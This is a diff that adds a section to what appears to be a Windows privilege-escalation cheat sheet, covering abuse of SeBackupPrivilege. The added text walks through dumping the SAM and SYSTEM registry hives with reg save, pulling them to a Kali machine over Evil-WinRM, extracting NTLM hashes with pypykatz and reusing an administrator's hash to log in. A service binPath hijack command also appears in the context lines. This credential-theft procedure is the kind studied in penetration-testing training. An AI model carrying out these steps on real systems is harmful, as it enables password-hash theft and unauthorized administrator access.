@@ -102,6 +102,44 @@ All-in-one comnand:
 
     sc config <service> binPath= "<command>" depend= "" start= demand obj= ".\LocalSystem" password= ""
 </details>
+
+<details>
+<summary>SeBackupPrivilege</summary>
+ <br> 
+This specific privilege escalation is based on the act of assigning a user the SeBackupPrivilege. It was designed to allow users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files.
+
+Files like the SAM file or the SYSTEM registry file are particularly valuable to attackers. Once an attacker gains an initial foothold in the system, they can exploit this access to move up to an elevated shell. They do this by reading the SAM files and potentially cracking the passwords of high-privilege users on the system or network.
+
+After connecting to the target machine using Evil-WinRM, we can check if the user we logged in has the SeBackupPrivilege. This can be done with the help of the whoami command with the /priv option. It can be observed from the image below that the user aarti has the SeBackupPrivilege.
+
+    whoami /priv
+
+
+
+## Exploiting Privilege on Windows
+Now, we can start the exploitation of this privilege. As we discussed earlier that this privilege allows the user to read all the files in the system, we will use this to our advantage. To begin, we will traverse to the C:\ directory and then move to create a Temp directory. We can also traverse to a directory with read and write privileges if the attacker is trying to be sneaky. Then we change the directory to Temp. Here we use our SeBackupPrivilege to read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it.
+
+     cd c:\
+     mkdir Temp
+     reg save hklm\sam c:\Temp\sam
+     reg save hklm\system c:\Temp\system
+
+  
+
+Transferring Files to Kali Linux
+Now that the Temp directory contains the SAM and SYSTEM files, use the Evil-WinRM download command to transfer these files to your Kali Linux machine.
+
+    cd Temp
+    download sam
+    download system
+## Extracting Hashes with Pypykatz and Gaining Access
+Now, we can extract the hive secrets from the SAM and SYSTEM files using the pypykatz. If not present on your Kali Linux, you can download it from its GitHub[https://github.com/skelsec/pypykatz]. It is a variant of Mimikatz cooked in Python. So, we can run its registry function and then use the –sam parameter to provide the path to the SAM and SYSTEM files. As soon as the command run, we can see in the demonstration below that we have successfully extracted the NTLM hashes of the Administrator account and other users as well.
+
+    pypykatz registry --sam sam system
+
+Now, we can use the NTLM Hash of the raj user to get access to the target machine as a raj user. We again used Evil-WinRM to do this. After connecting to the target machine, we run net user to see that raj user is a part of the Administrator group. This means we have successfully elevated privilege over our initial shell as the aarti user.
+
+ </details>
 <details>
 <summary>Unquoted Service Pathss</summary>
  <br> 
